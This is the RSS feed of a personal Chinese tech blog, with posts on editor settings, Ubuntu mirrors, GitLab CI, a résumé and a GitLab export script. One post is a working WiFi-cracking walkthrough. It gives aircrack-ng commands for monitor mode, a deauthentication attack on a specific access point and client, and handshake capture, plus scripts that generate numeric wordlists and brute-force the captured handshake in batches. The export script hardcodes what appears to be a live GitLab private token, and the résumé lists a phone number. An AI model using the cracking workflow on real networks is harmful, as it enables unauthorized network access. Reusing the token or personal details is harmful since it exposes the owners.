<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>唐任斌的博客</title><link>https://tangrenbin.github.io</link><description>探索技术边界的思考与分享</description><copyright>唐任斌的博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://tangrenbin.github.io</link></image><lastBuildDate>Wed, 27 Aug 2025 14:23:11 +0000</lastBuildDate><managingEditor>唐任斌的博客</managingEditor><ttl>60</ttl><webMaster>唐任斌的博客</webMaster><item><title>VScode 好用插件</title><link>https://tangrenbin.github.io/post/VScode%20-hao-yong-cha-jian.html</link><description>1. Markdown Preview Enhanced（Markdown 一键导出HTML/PDF）
2. markmap（Markdown 转思维导图）。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/VScode%20-hao-yong-cha-jian.html</guid><pubDate>Thu, 03 Jul 2025 02:29:08 +0000</pubDate></item><item><title>WIFI密码破解</title><link>https://tangrenbin.github.io/post/WIFI-mi-ma-po-jie.html</link><description># 命令
```shell
# 查看可用网卡
airmon-ng 

# 启动监听
airmon-ng start wlan0

# 查看网卡名字
ifconfig

#扫描 
airodump-ng wlan0mon

#开始抓包
airodump-ng wlan0mon -c 1 --bssid 44:F7:70:28:D1:32 -w ./344c 

# 发送10次ACK攻击
aireplay-ng -0 10 -a 44:F7:70:28:D1:32 -c 58:B6:23:C0:47:98 wlan0mo

#字典去重
cat ./wpa-dictionary-master/common.txt | python3 ./wpa-dictionary-master/normalize.py &gt; clean_common.txt

#暴力破解
aircrack-ng -w ./password_10000000_to_10999999.txt ./handshake-01.cap -b 44:F7:70:28:D1:32

#脚本破解
python3 test_passwords.py ./test_dict.txt ./handshake-01.cap
```

# 抓包文件

[1.log](https://github.com/user-attachments/files/20983910/1.log)

- 受上传限制，下载后更名为handshake-01.cap


# 生成8位纯数字密码脚本
```shell
#!/bin/bash

# 按范围生成8位纯数字密码的脚本

echo '=== 8位纯数字密码范围生成器 ==='

# 主函数
main() {
    if [ '$1' = '-h' ] || [ '$1' = '--help' ]; then
        echo '用法: $0 [选项]'
        echo '选项:'
        echo '  -s START    起始数字 (默认: 10000000)'
        echo '  -e END      结束数字 (默认: 19999999)'
        echo '  -o OUTPUT   输出文件名前缀 (默认: password)'
        echo '  -h, --help  显示帮助信息'
        echo ''
        echo '示例:'
        echo '  $0 -s 10000000 -e 19999999'
        echo '  $0 -s 20000000 -e 29999999 -o xiaomi'
        echo '  $0 -s 12345678 -e 12345688'
        exit 0
    fi
    
    # 默认参数
    start_num=10000000
    end_num=19999999
    output_prefix='password'
    
    # 解析命令行参数
    while [ $# -gt 0 ]; do
        case $1 in
            -s)
                start_num='$2'
                shift 2
                ;;
            -e)
                end_num='$2'
                shift 2
                ;;
            -o)
                output_prefix='$2'
                shift 2
                ;;
            *)
                echo '未知参数: $1'
                echo '使用 -h 查看帮助'
                exit 1
                ;;
        esac
    done
    
    # 验证参数
    if ! [[ '$start_num' =~ ^[0-9]+$ ]] || [ '$start_num' -lt 10000000 ] || [ '$start_num' -gt 99999999 ]; then
        echo '错误: 起始数字必须是8位数字 (10000000-99999999)'
        exit 1
    fi
    
    if ! [[ '$end_num' =~ ^[0-9]+$ ]] || [ '$end_num' -lt 10000000 ] || [ '$end_num' -gt 99999999 ]; then
        echo '错误: 结束数字必须是8位数字 (10000000-99999999)'
        exit 1
    fi
    
    if [ '$start_num' -gt '$end_num' ]; then
        echo '错误: 起始数字不能大于结束数字'
        exit 1
    fi
    
    # 计算范围大小
    range_size=$((end_num - start_num + 1))
    
    # 检查范围大小是否合理
    if [ $range_size -gt 10000000 ]; then
        echo '警告: 范围过大 ($range_size 个密码)，建议分批生成'
        echo '当前范围: $start_num 到 $end_num'
        read -p '是否继续? (y/N): ' confirm
        if [[ ! $confirm =~ ^[Yy]$ ]]; then
            echo '已取消'
            exit 0
        fi
    fi
    
    # 生成文件名
    filename='${output_prefix}_${start_num}_to_${end_num}.txt'
    
    echo '起始数字: $start_num'
    echo '结束数字: $end_num'
    echo '密码数量: $range_size'
    echo '输出文件: $filename'
    echo ''
    
    # 检查磁盘空间
    estimated_size=$((range_size * 9))  # 每个密码8位+换行符
    available_space=$(df . | awk 'NR==2 {print $4}')
    if [ $estimated_size -gt $available_space ]; then
        echo '错误: 磁盘空间不足'
        echo '需要空间: ${estimated_size} 字节'
        echo '可用空间: ${available_space} 字节'
        exit 1
    fi
    
    echo '开始生成密码...'
    
    # 生成密码
    seq $start_num $end_num &gt; '$filename'
    
    # 检查生成结果
    actual_count=$(wc -l &lt; '$filename')
    file_size=$(wc -c &lt; '$filename')
    
    echo ''
    echo '✅ 密码生成完成!'
    echo '📁 文件: $filename'
    echo '📊 实际生成: $actual_count 个密码'
    echo '💾 文件大小: $file_size 字节'
    echo ''
    echo '前10个密码预览:'
    head -10 '$filename'
    
    if [ $actual_count -gt 10 ]; then
        echo '...'
        echo '后10个密码预览:'
        tail -10 '$filename'
    fi
}

# 运行主函数
main '$@' 
```

# 自动跑任务脚本
```shell
#!/bin/bash

# 8位纯数字密码完整破解脚本
# 范围：10000000-99999999 (9000万个密码)

echo '=== 8位纯数字密码完整破解脚本 ==='
echo '开始时间: $(date)'
echo ''

# 创建报告文件
report_file='crack_report_$(date +%Y%m%d_%H%M%S).txt'
echo '8位纯数字密码破解报告' &gt; '$report_file'
echo '开始时间: $(date)' &gt;&gt; '$report_file'
echo '目标网络: Xiaomi_344C (44:F7:70:28:D1:32)' &gt;&gt; '$report_file'
echo '========================================' &gt;&gt; '$report_file'

# 定义范围参数
start_range=10000000
end_range=99999999
batch_size=1000000  # 每批100万个密码

# 计算总批次数
total_batches=$(((end_range - start_range + 1) / batch_size))
current_batch=1

echo '总范围: $start_range 到 $end_range'
echo '每批大小: $batch_size 个密码'
echo '总批次数: $total_batches'
echo ''

# 主循环
for ((batch_start=start_range; batch_start&lt;=end_range; batch_start+=batch_size)); do
    batch_end=$((batch_start + batch_size - 1))
    
    # 确保不超过最大范围
    if [ $batch_end -gt $end_range ]; then
        batch_end=$end_range
    fi
    
    echo '========================================'
    echo '批次 $current_batch/$total_batches'
    echo '范围: $batch_start 到 $batch_end'
    echo '开始时间: $(date)'
    echo ''
    
    # 生成密码文件
    echo '正在生成密码文件...'
    ./generate_password.sh -s $batch_start -e $batch_end -o 'batch_${current_batch}'
    
    if [ $? -ne 0 ]; then
        echo '❌ 密码生成失败，跳过此批次'
        echo '批次 $current_batch: $batch_start-$batch_end - 生成失败' &gt;&gt; '$report_file'
        current_batch=$((current_batch + 1))
        continue
    fi
    
    password_file='batch_${current_batch}_${batch_start}_to_${batch_end}.txt'
    
    # 检查文件是否存在
    if [ ! -f '$password_file' ]; then
        echo '❌ 密码文件不存在: $password_file'
        echo '批次 $current_batch: $batch_start-$batch_end - 文件不存在' &gt;&gt; '$report_file'
        current_batch=$((current_batch + 1))
        continue
    fi
    
    # 开始破解
    echo '开始破解...'
    echo '使用字典: $password_file'
    echo ''
    
    # 运行aircrack-ng并捕获输出
    crack_output=$(aircrack-ng -w '$password_file' ./handshake-01.cap -b 44:F7:70:28:D1:32 2&gt;&amp;1)
    crack_result=$?
    
    # 检查是否找到密码
    if echo '$crack_output' | grep -q 'KEY FOUND'; then
        password=$(echo '$crack_output' | grep 'KEY FOUND' | awk '{print $4}')
        echo '🎉 密码找到了!'
        echo '密码: $password'
        echo '范围: $batch_start 到 $batch_end'
        echo ''
        
        # 记录到报告
        echo '✅ 成功找到密码!' &gt;&gt; '$report_file'
        echo '密码: $password' &gt;&gt; '$report_file'
        echo '范围: $batch_start 到 $batch_end' &gt;&gt; '$report_file'
        echo '批次: $current_batch' &gt;&gt; '$report_file'
        echo '结束时间: $(date)' &gt;&gt; '$report_file'
        
        # 删除密码文件
        rm -f '$password_file'
        echo '已删除密码文件: $password_file'
        
        echo '破解完成！密码已找到。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/WIFI-mi-ma-po-jie.html</guid><pubDate>Mon, 30 Jun 2025 16:32:43 +0000</pubDate></item><item><title>Ubuntu设置成清华源并安装clang和clang-format</title><link>https://tangrenbin.github.io/post/Ubuntu-she-zhi-cheng-qing-hua-yuan-bing-an-zhuang-clang-he-clang-format.html</link><description>```shell
#!/bin/bash

echo '=== 配置清华大学镜像源安装 clang ==='

# 备份原始源
sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
echo '✓ 已备份原始源配置到 /etc/apt/sources.list.backup'

# 获取Ubuntu版本代号
UBUNTU_VERSION=$(lsb_release -cs)
echo '检测到Ubuntu版本: $UBUNTU_VERSION'

# 写入清华大学镜像源配置
cat &lt;&lt; EOF | sudo tee /etc/apt/sources.list
# 清华大学开源软件镜像站
# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-updates main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-backports main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-security main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-security main restricted universe multiverse

# 预发布软件源，不建议启用
# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-proposed main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ $UBUNTU_VERSION-proposed main restricted universe multiverse
EOF

echo '✓ 已配置清华大学镜像源'

# 更新软件包列表
echo '正在更新软件包列表...'
sudo apt update

if [ $? -eq 0 ]; then
    echo '✓ 软件包列表更新成功'
else
    echo '❌ 软件包列表更新失败，可能网络有问题'
    exit 1
fi

# 搜索可用的clang版本
echo ''
echo '=== 可用的clang版本 ==='
apt-cache search '^clang-[0-9]' | sort

echo ''
echo '=== 安装clang和clang-format ==='

# 安装clang和clang-format
sudo apt install -y clang clang-format

# 检查安装结果
if [ $? -eq 0 ]; then
    echo '✓ clang和clang-format安装成功'
    
    # 验证安装
    echo ''
    echo '=== 安装验证 ==='
    echo 'clang版本：'
    clang --version
    echo ''
    echo 'clang-format版本：'
    clang-format --version
    
    echo ''
    echo '✅ 安装完成！'
else
    echo '❌ 安装失败'
    exit 1
fi

# 提供恢复原始源的命令
echo ''
echo '📝 如需恢复原始软件源，请运行：'
echo '   sudo cp /etc/apt/sources.list.backup /etc/apt/sources.list'
echo '   sudo apt update'

echo ''
echo '🔧 如需安装特定版本的clang，可运行：'
echo '   sudo apt install clang-11 clang-format-11  # 安装clang 11'
echo '   sudo apt install clang-12 clang-format-12  # 安装clang 12' 
```。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Ubuntu-she-zhi-cheng-qing-hua-yuan-bing-an-zhuang-clang-he-clang-format.html</guid><pubDate>Thu, 29 May 2025 04:03:05 +0000</pubDate></item><item><title>Cursor和VS Code设置</title><link>https://tangrenbin.github.io/post/Cursor-he-VS%20Code-she-zhi.html</link><description># 设置文件路径
```TXT
C:\Users\Administrator\AppData\Roaming\Cursor\User
```

# 设置
```json
{
    // 文件关联设置
    'files.associations': {
        '*.h': 'c', // 将.h文件识别为C语言文件
        '*.c': 'c', // 将.c文件识别为C语言文件
        '*.py': 'python', // 将.py文件识别为Python文件
        '*.md': 'markdown', // 将.md文件识别为Markdown文件
        '*.sh': 'shellscript' // 将.sh文件识别为Shell脚本
    },
    // 编码和保存设置
    'files.encoding': 'utf8', // 默认使用UTF-8编码
    'files.autoSave': 'afterDelay', // 延迟一段时间后自动保存
    'files.autoSaveDelay': 1000, // 自动保存延迟时间为1000毫秒
    'files.eol': '\n', // 行尾使用LF换行符
    // 特定文件类型的编码设置
    '[c]': {
        'files.encoding': 'gb2312' // C语言文件使用GB2312编码
    },
    // 编辑器设置
    'editor.insertSpaces': true, // 插入空格而非Tab字符
    'editor.tabSize': 4, // Tab等于4个空格
    'editor.renderWhitespace': 'all', // 显示所有空白字符
    'editor.wordWrap': 'on', // 启用自动换行
    'editor.minimap.enabled': false, // 禁用代码缩略图
    // 'editor.fontFamily': ''JetBrains Mono', 'Source Code Pro', Consolas, monospace', // 设置编辑器字体
    'editor.fontLigatures': true, // 启用字体连字
    'editor.suggestSelection': 'first', // 自动选择第一个建议
    'editor.formatOnSave': false, // 保存时格式化
    'editor.formatOnPaste': false, // 粘贴时格式化
    'editor.mouseWheelZoom': true, // 允许通过Ctrl+滚轮缩放
    // 工作台设置
    'workbench.activityBar.orientation': 'vertical', // 活动栏垂直排列
    'workbench.sideBar.location': 'right', // 侧边栏位于右侧
    'workbench.colorTheme': 'Visual Studio Dark - C++', // 设置颜色主题
    'workbench.iconTheme': 'material-icon-theme', // 设置文件图标主题
    'workbench.startupEditor': 'none', // 启动时不打开编辑器
    'workbench.editor.enablePreview': false, // 禁用预览模式
    // C/C++设置
    'C_Cpp.errorSquiggles': 'disabled', // 禁用C/C++错误波浪线
    // PlantUML设置
    'plantuml.server': 'https://www.plantuml.com/plantuml', // PlantUML服务器地址
    // 终端配置
    'terminal.integrated.profiles.windows': {
        'PowerShell': {
            'source': 'PowerShell', // PowerShell终端
            'icon': 'terminal-powershell' // 使用PowerShell图标
        },
        'Command Prompt': {
            'path': [
                '${env:windir}\\Sysnative\\cmd.exe', // 64位cmd路径
                '${env:windir}\\System32\\cmd.exe' // 32位cmd路径
            ],
            'args': [], // 命令参数
            'icon': 'terminal-cmd' // 使用cmd图标
        },
        'Git Bash': {
            'source': 'Git Bash' // Git Bash终端
        },
        'Ubuntu-18.04 (WSL)': {
            'path': 'C:\\WINDOWS\\System32\\wsl.exe', // WSL路径
            'args': [
                '-d',
                'Ubuntu-18.04' // 指定Ubuntu-18.04发行版
            ]
        }
    },
    'terminal.integrated.defaultProfile.windows': 'Ubuntu-18.04 (WSL)', // 默认使用Ubuntu WSL终端
    // 资源管理器设置
    'explorer.confirmDelete': false, // 删除文件时不需确认
    'explorer.confirmDragAndDrop': false, // 拖放文件时不需确认
    // 其他设置
    'terminal.integrated.enableMultiLinePasteWarning': false, // 禁用多行粘贴警告
    'diffEditor.ignoreTrimWhitespace': false, // 比较时不忽略空白字符差异
    'C_Cpp.dimInactiveRegions': false, // 不淡化C/C++非活动区域
    'varTranslation.translationEngine': 'baidu', // 变量翻译引擎使用百度
    'git.ignoreLegacyWarning': true, // 忽略Git旧版警告
    // SSH远程平台设置
    'remote.SSH.remotePlatform': {
        '172.17.0.100': 'linux', // 指定远程主机为Linux系统
        '192.168.0.68': 'linux',
        '192.168.0.96': 'linux',
        '172.17.0.159': 'linux',
        '100.94.170.40': 'linux'
    },
    'cmake.showOptionsMovedNotification': false, // 不显示CMake选项移动通知
    'files.trimTrailingWhitespaceInRegexAndStrings': false, // 不删除正则表达式和字符串中的尾随空格
    // Markdown特定设置
    '[markdown]': {
        'diffEditor.ignoreTrimWhitespace': true // Markdown中比较忽略空白字符
    },
    'C_Cpp.default.compilerPath': '/usr/bin/gcc', // 默认C/C++编译器路径
    // 终端增强
    'terminal.integrated.fontSize': 14, // 终端字体大小
    'terminal.integrated.cursorBlinking': true, // 终端光标闪烁
    'terminal.integrated.cursorStyle': 'line', // 终端光标样式为线条
    // Git增强
    'git.enableSmartCommit': true, // 启用智能提交
    'git.confirmSync': false, // 同步时不需确认
    'git.autofetch': true, // 自动拉取远程更新
    // AI相关设置
    'ai.auto.suggest': true, // 启用AI自动建议
    'ai.completions.enabled': true, // 启用AI代码补全
    'ai.completions.proxy.enabled': false, // 禁用AI代理
    // WSL增强
    'remote.WSL.fileWatcher.polling': true, // 使用轮询方式监视WSL文件变化
    'http.proxy': 'socks5://127.0.0.1:10808',//应对cursor无法选择claud-4模型
    'http.proxyStrictSSL': false,
    'http.proxySupport': 'on'

}
```
。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Cursor-he-VS%20Code-she-zhi.html</guid><pubDate>Mon, 21 Apr 2025 08:46:04 +0000</pubDate></item><item><title>证件照</title><link>https://tangrenbin.github.io/post/zheng-jian-zhao.html</link><description>![image](https://github.com/user-attachments/assets/eea94175-dec6-4d33-a374-bbd8c96164de)
![image](https://github.com/user-attachments/assets/50d43832-874a-4bdb-a187-c2eebe6f683e)
![image](https://github.com/user-attachments/assets/879700d5-842e-446d-b2ef-96bdc8bfcc7c)。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/zheng-jian-zhao.html</guid><pubDate>Sun, 20 Apr 2025 15:59:13 +0000</pubDate></item><item><title>将来也许能用到的开源库</title><link>https://tangrenbin.github.io/post/jiang-lai-ye-xu-neng-yong-dao-de-kai-yuan-ku.html</link><description># 内存管理

-  [umm_malloc](https://github.com/rhempel/umm_malloc)
-  [lwmem](https://github.com/MaJerle/lwmem)

# 日志打印

- [uLog](https://github.com/rdpoor/ulog)
- [trice](https://github.com/rokath/trice)
- [lwprintf](https://github.com/MaJerle/lwprintf)

# 压缩算法
- [heatshrink](https://github.com/atomicobject/heatshrink)
可以用于升级压缩，先在cco端压缩好，再传包
- [minilzo](https://mp.weixin.qq.com/s/9iebkJcf5mGfIiRtGdqQmA)
- [FastLZ](https://github.com/ariya/FastLZ)

# 环型队列
- [fifofast](https://github.com/nqtronix/fifofast)。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/jiang-lai-ye-xu-neng-yong-dao-de-kai-yuan-ku.html</guid><pubDate>Thu, 03 Apr 2025 03:12:49 +0000</pubDate></item><item><title>简历</title><link>https://tangrenbin.github.io/post/jian-li.html</link><description># 个人信息
- 姓名：唐任斌
- 学历：本科
- 手机（微信）：18894242252
- 职业定位：嵌入式软件工程师 / 项目经理

# 专业技能
- 精通嵌入式应用软件开发，具备扎实的C语言编程功底
- 深入掌握电力载波通信技术及相关协议：
  - 《QGDW 10376.2-2019 用电信息采集系统通信协议第2部分：集中器本地通信模块接口》
  - 《DLT-645-2007-多功能电能表通信协议2010》
  - 《HPLC技术应用手册-中国电科院V2 7-20190821》
  - 《面向对象的用电信息数据交换协议（20210910）》
  - 《低压电力线宽带载波通信规约 第6部分：应用层通信协议》
  - 《低压电力线宽带载波通信规约 第5部分：数据链路层通信协议》
- 具备项目管理经验，能够独立负责项目规划与团队管理
- 擅长系统分析与问题解决，具有良好的技术文档编写能力
- 创新性地运用AI工具提升团队开发效率，实现技术赋能

# 工作经历

## 北京中宸微电子 | 2021.12 - 至今
核心职责：
- 载波通信模块应用组组长：带领团队完成多省电力公司定制化需求开发，保障送检和供货工作正常进行
- 中压载波机项目经理：统筹项目整体规划与执行
- 3780A载波模块项目经理：负责产品研发全流程管理

主要成就：
1. 主导载波通信模块核心架构设计，显著提升系统性能和可维护性
2. 成功完成多个省份电力公司的技术需求，确保项目高质量交付
3. 建立完善的项目管理体系，有效提升团队研发效率

# 核心项目开发经验

**精通国网、南网及各省份应用层业务，掌握度达70%以上**

1. **福建STA**
   - NTB记录上报
   - 引脚变位上报
   - 数据冻结、不一致、幅值越限、区间越限四类本地任务及产生数据的增删改查
   - 扩展645/698协议栈设计与实现
   - 精通福建STA所有业务

2. **江苏采集器/CCO/STA**
   - 二采缩位搜表
   - CCO波特率协商
   - 时钟维护
   - 表类型探测
   - 疑似停复电
   - 数据冻结与点名上报

3. **陕西（湖南）/CCO/STA**
   - 时钟超差上报与时钟维护
   - 零火线异常电流上报
   - 数据冻结

4. **三圣（科大）IOT-C**
   - 采集器模式切换
   - 入网地址切换
   - 制定STA为下级设备升级标准及撰写适配指南

5. **国网（南网）基础采集器/CCO/STA**
    - 绑表、搜表、验表
    - 事件上报
    - 灯语
    - 时钟管理
    - 升级
    - 抄控器
    - 停复电上报
    - 抄表

6. **中压载波机**
   - 相同硬件下主机和从机程序切换
   - 窄带宽带链路可用性网络评估

7. **南网电鸿操作系统适配**
   - 创新性封装电鸿操作系统接口，实现无缝兼容
   - 利用submodule技术，2周内完成系统迁移并通过认证
   - 创新应用差分升级技术，解决升级空间受限问题

8. **模块出厂工装**
   - 载波（无线）灵敏度测试
   - 动态（静态）功耗测试
   - 创新使用省份代码配置方案，优化工厂生产流程，降低生成过程中对软件的依赖

9. **载波监听单元项目**
   - 成功移植文件操作系统，实现SD卡数据存储
   - 协助完成专利申请，助力考核指标达成

# 框架设计经验

1. **通用数据冻结（曲线存储）框架**
    - 统一多省份任务执行标准，降低70%维护成本
    - 创新引入FlashDB解决方案，提升系统性能与可扩展性
    - 创新引入压缩算法，在有限的FLASH空间内存储更多的数据，降低硬件成本
    - 显著降低缺陷密度，从千行10个降至3个

2. **福建698扩展OAD管理框架**
    - 设计模块化数据处理架构
    - 实现功能解耦与灵活配置

3. **各省份灯语框架**
    - 统一各省份不同的灯语需求的实现逻辑，降低维护人力成本

# 管理经验

1. **GIT代码仓库管理创新**
   - 制定并推行《GIT代码提交与合并规范》
   - 建立分支管理体系
   - 引入submodule模块化管理
   - 构建CI/CD自动化代码扫描体系
   - 创新应用AI技术优化代码评审

2. **团队人员管理**
   - 参与技术人员面试与招聘
   - 设计并实施团队绩效考核方案
   - 负责团队成员的技术培训与能力提升
   - 进行工作任务拆分、分配与进度跟踪
   - 严格要求先做详细设计然后评审设计最后编码的开发流程

3. **代码质量管理**
   - 主导制定《中宸代码规范企业标准》
   - 实施函数复杂度控制（≤15）
   - 规范化注释与命名标准
   - 推行防御性编程理念

# 个人特点
- 注重团队协作，乐于分享技术经验
- 保持开放学习的心态，积极接纳新技术
- 善于倾听与沟通，协调推进项目开展
- 踏实认真，勇于面对挑战。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/jian-li.html</guid><pubDate>Sun, 30 Mar 2025 14:11:50 +0000</pubDate></item><item><title>代码评审自动化工具</title><link>https://tangrenbin.github.io/post/dai-ma-ping-shen-zi-dong-hua-gong-ju.html</link><description># 代码评审自动化工具

这是一个基于 Gemini API 的自动化代码评审工具，可以自动分析 Git 仓库中的代码变更并生成评审报告。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/dai-ma-ping-shen-zi-dong-hua-gong-ju.html</guid><pubDate>Tue, 21 Jan 2025 09:49:13 +0000</pubDate></item><item><title>Gemini Chat Python 客户端</title><link>https://tangrenbin.github.io/post/Gemini%20Chat%20Python%20-ke-hu-duan.html</link><description># Gemini Chat Python 客户端

这是一个基于 Python 实现的 Gemini AI 聊天客户端，提供了更多高级功能和更好的异步性能。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Gemini%20Chat%20Python%20-ke-hu-duan.html</guid><pubDate>Tue, 21 Jan 2025 07:55:58 +0000</pubDate></item><item><title>Gemini Chat Shell 客户端</title><link>https://tangrenbin.github.io/post/Gemini%20Chat%20Shell%20-ke-hu-duan.html</link><description># Gemini Chat Shell 客户端

这是一个基于 Shell 实现的 Gemini AI 聊天客户端，支持多个 Gemini 模型，提供简单直观的命令行界面。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Gemini%20Chat%20Shell%20-ke-hu-duan.html</guid><pubDate>Tue, 21 Jan 2025 07:47:48 +0000</pubDate></item><item><title>GitLab 使用CI/CD 配合lizard 扫描代码</title><link>https://tangrenbin.github.io/post/GitLab%20-shi-yong-CI-CD%20-pei-he-lizard%20-sao-miao-dai-ma.html</link><description>```yml&#13;
stages:&#13;
  - quality&#13;
&#13;
code_complexity:&#13;
  stage: quality&#13;
  tags:&#13;
    - linux&#13;
  variables:&#13;
    GIT_DEPTH: 0&#13;
    GIT_STRATEGY: clone&#13;
    CCN_THRESHOLD: 10      # 圈复杂度阈值&#13;
    LENGTH_THRESHOLD: 50   # 函数长度阈值&#13;
    PARAM_THRESHOLD: 4     # 参数个数阈值&#13;
&#13;
  script:&#13;
    - |&#13;
      # 创建空的报告文件&#13;
      echo '[]' &gt; complexity_report.json&#13;
&#13;
      # 提取变更文件&#13;
      if [ -n '$CI_MERGE_REQUEST_ID' ]; then&#13;
        echo '合并请求检测，提取变更文件...'&#13;
        git fetch origin '$CI_MERGE_REQUEST_TARGET_BRANCH_NAME' --depth=50&#13;
        changed_files=$(git diff --name-only FETCH_HEAD '$CI_COMMIT_SHA' | grep -E '\.(c|h)$' || true)&#13;
      else&#13;
        echo '直接提交检测，提取最近一次提交变更文件...'&#13;
        changed_files=$(git diff --name-only HEAD~1 HEAD | grep -E '\.(c|h)$' || true)&#13;
      fi&#13;
&#13;
      # 检查变更文件并运行复杂度检查&#13;
      if [ -z '$changed_files' ]; then&#13;
        echo '未检测到变更文件，跳过复杂度检查'&#13;
        exit 0&#13;
      else&#13;
        echo '检测到以下变更文件：'&#13;
        echo '$changed_files'&#13;
&#13;
        # 运行 lizard 检查&#13;
        lizard \&#13;
          --CCN $CCN_THRESHOLD \&#13;
          --length $LENGTH_THRESHOLD \&#13;
          --arguments $PARAM_THRESHOLD \&#13;
          --warnings_only \&#13;
          --modified \&#13;
          $changed_files | tee complexity_report.txt&#13;
&#13;
        # 检查是否有超过阈值的函数&#13;
        if [ -s complexity_report.txt ]; then&#13;
          echo '发现以下复杂度问题：'&#13;
          cat complexity_report.txt&#13;
          echo '建议:'&#13;
          echo '1. 考虑将复杂的逻辑拆分为多个子函数'&#13;
          echo '2. 使用策略模式或状态模式简化条件判断'&#13;
          echo '3. 减少嵌套的条件语句'&#13;
          echo '4. 考虑使用结构体封装参数'&#13;
          echo '5. 检查是否有可以合并或省略的参数'&#13;
          exit 1&#13;
        else&#13;
          echo '代码复杂度检查通过！'&#13;
        fi&#13;
      fi&#13;
&#13;
  artifacts:&#13;
    when: always&#13;
    paths:&#13;
      - complexity_report.txt&#13;
      - complexity_report.json&#13;
    expire_in: 1 week&#13;
&#13;
  rules:&#13;
    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'&#13;
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH&#13;
&#13;
  allow_failure: false&#13;
&#13;
```&#13;
&#13;
# 遇到的问题&#13;
1. 老是在容器环境和宿主环境中乱跳。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/GitLab%20-shi-yong-CI-CD%20-pei-he-lizard%20-sao-miao-dai-ma.html</guid><pubDate>Tue, 07 Jan 2025 07:58:50 +0000</pubDate></item><item><title>Git Submodule 使用指南</title><link>https://tangrenbin.github.io/post/Git%20Submodule%20-shi-yong-zhi-nan.html</link><description># Git Submodule 使用指南&#13;
&#13;
Git 子模块允许你将一个 Git 仓库作为另一个 Git 仓库的子目录。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Git%20Submodule%20-shi-yong-zhi-nan.html</guid><pubDate>Mon, 06 Jan 2025 13:53:38 +0000</pubDate></item><item><title>Cursor 软件写Markdown 被格式化</title><link>https://tangrenbin.github.io/post/Cursor%20-ruan-jian-xie-Markdown%20-bei-ge-shi-hua.html</link><description>为了获得这样清晰的 Markdown 格式，你可以使用以下提示词：&#13;
'请用最简洁的 Markdown 格式编写，避免嵌套的代码块，保持以下格式：&#13;
&#13;
1. 使用单层标题层级 (#, ##, ###)&#13;
&#13;
2. 代码命令直接放在相关标题下，无需额外的代码块标记&#13;
&#13;
3. 使用简单的列表 (1. 2. 3. 或 - )&#13;
&#13;
4. 避免复杂的格式化和嵌套结构'&#13;
&#13;
或者更简单地说：&#13;
'请使用最简洁的 Markdown 格式，避免嵌套代码块，直接在标题下展示命令。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Cursor%20-ruan-jian-xie-Markdown%20-bei-ge-shi-hua.html</guid><pubDate>Mon, 06 Jan 2025 13:44:53 +0000</pubDate></item><item><title>Lizard 代码复杂度分析工具使用指南</title><link>https://tangrenbin.github.io/post/Lizard%20-dai-ma-fu-za-du-fen-xi-gong-ju-shi-yong-zhi-nan.html</link><description># Lizard 代码复杂度分析工具使用指南&#13;
&#13;
## 1. 简介&#13;
Lizard 是一个简单但功能强大的代码复杂度分析工具，支持多种编程语言（包括 C/C++、JavaScript、Python、Ruby 等）。</description><guid isPermaLink="true">https://tangrenbin.github.io/post/Lizard%20-dai-ma-fu-za-du-fen-xi-gong-ju-shi-yong-zhi-nan.html</guid><pubDate>Mon, 06 Jan 2025 03:58:32 +0000</pubDate></item><item><title>gitlab 批量导出mr记录</title><link>https://tangrenbin.github.io/post/gitlab%20-pi-liang-dao-chu-mr-ji-lu.html</link><description>```python&#13;
import os&#13;
import requests&#13;
import pandas as pd&#13;
from datetime import datetime, timedelta&#13;
import logging&#13;
&#13;
# 配置&#13;
BASE_URL = 'http://172.17.0.100:8080/api/v4'&#13;
PRIVATE_TOKEN = 'h_8duuSiAJsP4Kd-uEyn'&#13;
USERNAME = 'kanghongyan'  # 替换为实际的用户名&#13;
START_DATE = '2024-01-01'&#13;
END_DATE = '2025-01-01'&#13;
OUTPUT_FILE_CSV = 'merge_requests_report.csv'&#13;
OUTPUT_FILE_EXCEL = 'merge_requests_report.xlsx'&#13;
&#13;
# 初始化日志&#13;
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')&#13;
&#13;
# 请求头&#13;
HEADERS = {'PRIVATE-TOKEN': PRIVATE_TOKEN}&#13;
&#13;
# 获取用户 ID&#13;
def fetch_author_id(username):&#13;
    url = f'{BASE_URL}/users'&#13;
